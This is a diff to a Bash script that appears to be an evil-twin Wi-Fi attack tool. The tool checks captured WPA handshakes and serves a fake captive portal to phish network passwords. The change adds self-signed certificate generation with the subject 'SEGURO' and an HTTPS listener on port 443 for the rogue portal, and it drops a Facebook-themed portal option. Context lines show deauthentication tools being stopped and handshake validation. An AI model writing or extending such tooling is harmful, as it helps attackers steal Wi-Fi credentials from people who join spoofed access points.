@@ -8,7 +8,6 @@ fi
 ##			      ##
 ################################
 
-
 if [[ $EUID -ne 0 ]]; then
         echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root."$transparent""
         exit 1
@@ -163,13 +162,13 @@ function exitmode {
 	fi
 
 	if [ "$WIFI_MONITOR" != "" ]; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$verde"$WIFI_MONITOR"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$green"$WIFI_MONITOR"$transparent""
 		./airmon stop $WIFI_MONITOR &> $flux_output_device
 	fi
 
 
 	if [ "$WIFI" != "" ]; then
-		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$verde"$WIFI"$transparent""
+		echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$green"$WIFI"$transparent""
 		./airmon stop $WIFI &> $flux_output_device
 		macchanger -p $WIFI &> $flux_output_device
 	fi
@@ -1403,7 +1402,7 @@ function askauth {
 		echo ""
 		case $yn in
 			1 ) authmode="handshake"; handshakelocation; break ;;
-			2 ) authmode="wpa_supplicant"; webinterface; break ;;
+			2 ) authmode="wpa_supplicant";  certssl; break ;;
 			3 ) askAP; break ;;
 			* ) echo "$general_case_error"; conditional_clear ;;
 		esac
@@ -3214,7 +3213,7 @@ function handshakelocation {
 				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
 					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-						webinterface
+						 certssl
 					else
 					echo "Corrupted handshake"
 					echo
@@ -3423,7 +3422,7 @@ function checkhandshake {
 		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			wpaclean $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
-			webinterface
+			certssl
 			i=2
 			break
 
@@ -3437,7 +3436,7 @@ function checkhandshake {
 		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap strip &>$flux_output_device
-			webinterface
+			certssl
 			i=2
 			break
 
@@ -3457,10 +3456,64 @@ function checkhandshake {
 
 ############################################# < HANDSHAKE > ############################################
 
+# function for ssl
+function certssl {
+# Test if the ssl certificate is generated correcly if there is any
 
+		if [ -f $DUMP_PATH/server.pem ]; then
+		if [ -s $DUMP_PATH/server.pem ]; then
 
+		webinterface
+		break
+		else
+		echo "                                       "
+		echo "  Certificate invalid or not present, please choice"
+		echo "                                       "
+		echo -e "      "$green"1)"$transparent" Create  a SSL certificate"
+		echo -e "      "$green"2)"$transparent" Search for SSl certificate" # hop to certssl check again 
+		echo -e "      "$green"3)"$red"Exit" $transparent
+		echo " "
+		echo -n '      #> '
+		read yn
 
+		case $yn in
+			1 ) creassl;;
+			2 ) certssl;break;;
+			3 ) exitmode; break;;
+			* ) echo "$general_case_error"; conditional_clear
+		esac
+		fi
+	else
+		while true; do
+		echo "                                       "
+		echo "   Certificate invalid or not present, please choice"
+		echo "                                       "
+		echo -e "      "$green"1)"$transparent" Create  a SSL certificate"
+		echo -e "      "$green"2)"$transparent" Search for SSl certificate" # hop to certssl check again 
+		echo -e "      "$green"3)"$red"Exit" $transparent
+		echo " "
+		echo -n '      #> '
+		read yn
+		
+		case $yn in
+			1 ) creassl;;
+			2 ) certssl; break;;
+			3 ) exitmode; break;;
+			* ) echo "$general_case_error"; conditional_clear
+		esac
+		
+	done
+		
+	fi
+	
 
+}
+
+# Create Self-Signed SSL Certificate
+function creassl {
+	xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout $DUMP_PATH/server.pem -out $DUMP_PATH/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
+	certssl
+}
 
 ############################################# < ATAQUE > ############################################
 
@@ -3520,8 +3573,7 @@ function webinterface {
 			echo -e "$blue""13)"$transparent" Portuguese  [POR]"
 			echo -e "$blue""15)"$transparent" German      [GER]"
 			echo -e "$blue""16)"$transparent" Chinese     [ZH_CN](NEUTRA)"
-			echo -e "$blue""17)"$transparent" Facebook" 
-			echo -e "$blue""18)"$transparent"\e[1;31m $general_back"$transparent""
+			echo -e "$blue""17)"$transparent"\e[1;31m $general_back"$transparent""
 			
 			echo
 			echo -n "#? "
@@ -3647,11 +3699,8 @@ function webinterface {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "17" ];then 
-				Facebook
-				break
-            
-            elif [ "$fluxass" = "18" ]; then
+			
+            elif [ "$fluxass" = "17" ]; then
 				continue
 			fi
 
@@ -3792,16 +3841,24 @@ mimetype.assign = (
 \".css\" => \"text/css\"
 )
 
-
 server.error-handler-404 = \"/\"
 
 static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
 index-file.names = ( \"index.htm\" )
 
+\$SERVER[\"socket\"] == \":443\" {
+	url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
+	ssl.engine                  = \"enable\" 
+	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+   
+}
 
 #Redirect www.domain.com to domain.com
 \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
-url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+	ssl.engine                  = \"enable\" 
+	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+	
 }
 
 " >$DUMP_PATH/lighttpd.conf
